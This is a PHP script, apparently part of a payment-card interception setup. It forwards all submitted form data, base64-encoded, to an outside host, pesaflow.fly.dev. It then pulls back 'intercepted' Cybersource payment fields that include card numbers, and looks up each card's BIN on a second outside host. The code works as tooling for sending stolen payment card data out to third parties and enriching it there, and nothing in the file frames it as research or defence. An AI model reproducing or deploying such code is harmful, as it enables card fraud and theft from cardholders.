<?php
header('Content-Type: application/json');

$data = $_POST;
$json = json_encode($data);
$base64 = base64_encode($json);

$url = 'https://pesaflow.fly.dev/?obj=' . urlencode($base64);
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
$error = curl_error($ch);
curl_close($ch);

if ($error) {
    echo json_encode(['success' => false, 'error' => 'Curl error: ' . $error]);
    exit;
}

$parsed = json_decode($response, true);
$parsed = json_decode($response, true);
if (!isset($parsed['intercepted'][0]['fields'])) {
    echo json_encode([
        'success' => false,
        'error' => 'Malformed response from Cybersource proxy',
        'raw_response' => $response
    ]);
    exit;
}
$fields = $parsed['intercepted'][0]['fields'];


if (!$fields) {
    echo json_encode(['success' => false, 'error' => 'Malformed response from Cybersource proxy']);
    exit;
}

// Step 1: Interpret Cybersource fields using cybersrc.php
$_POST = $fields;
ob_start();
include 'cybersrc.php';
$cybersource_interpretation = json_decode(ob_get_clean(), true);

// Step 2: Get BIN (first 6 of card number)
$bin = substr(str_replace(' ', '', $fields['card_number'] ?? ''), 0, 6);
$binData = [];
if ($bin) {
    $binUrl = "https://payment.tsavo.site/get_bin.php?bin=" . urlencode($bin);
    $ch = curl_init($binUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $binResponse = curl_exec($ch);
    if (!curl_error($ch)) {
        $binData = json_decode($binResponse, true);
    }
    curl_close($ch);
}

// Step 3: Return all
echo json_encode([
    'success' => true,
    'cybersource_interpretation' => $cybersource_interpretation,
    'bin_info' => $binData,
    'raw_fields' => $fields
]);
